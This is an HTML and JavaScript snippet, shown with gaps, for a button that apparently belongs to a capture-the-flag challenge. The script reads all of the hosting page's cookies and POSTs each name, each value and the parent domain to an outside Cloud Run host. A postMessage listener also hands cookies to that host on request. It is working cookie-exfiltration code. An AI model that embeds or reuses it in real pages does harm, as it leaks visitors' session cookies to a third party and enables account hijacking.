...
<div style="text-align: center; padding: 40px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9;">
  ...
  <button onclick="openCTFWithCookies()" 
...
<script>
function openCTFWithCookies() {
  // Get all cookies from the current page
  const cookies = document.cookie;
  const ctfUrl = 'https://ctf-cookies-o32xpkqaca-uc.a.run.app/';
  
  console.log('Sending cookies to CTF:', cookies);
  
  // Method 3: Create a form and submit to pass data via POST
  ...
  domainInput.name = 'parent_domain';
  ...
  // Add any specific cookie values that might be important
  const cookiePairs = cookies.split(';');
  cookiePairs.forEach((cookie, index) => {
    const [name, value] = cookie.trim().split('=');
    if (name && value) {
      const individualCookieInput = document.createElement('input');
      individualCookieInput.type = 'hidden';
      individualCookieInput.name = `cookie_${index}_name`;
      individualCookieInput.value = name;
      form.appendChild(individualCookieInput);
      
      const individualCookieValueInput = document.createElement('input');
      individualCookieValueInput.type = 'hidden';
      individualCookieValueInput.name = `cookie_${index}_value`;
      individualCookieValueInput.value = value;
      form.appendChild(individualCookieValueInput);
    }
  });
  ...
  console.log('Form submitted to CTF with cookie data');
}

// Backup method: Listen for postMessage requests from CTF window
window.addEventListener('message', function(event) {
  // Verify origin for security
  if (event.origin === 'https://ctf-cookies-o32xpkqaca-uc.a.run.app') {
    if (event.data.type === 'REQUEST_COOKIES') {
      // Send cookies back to the CTF window
      ...
      console.log('Responded to cookie request from CTF window');
    }
  }
});
</script>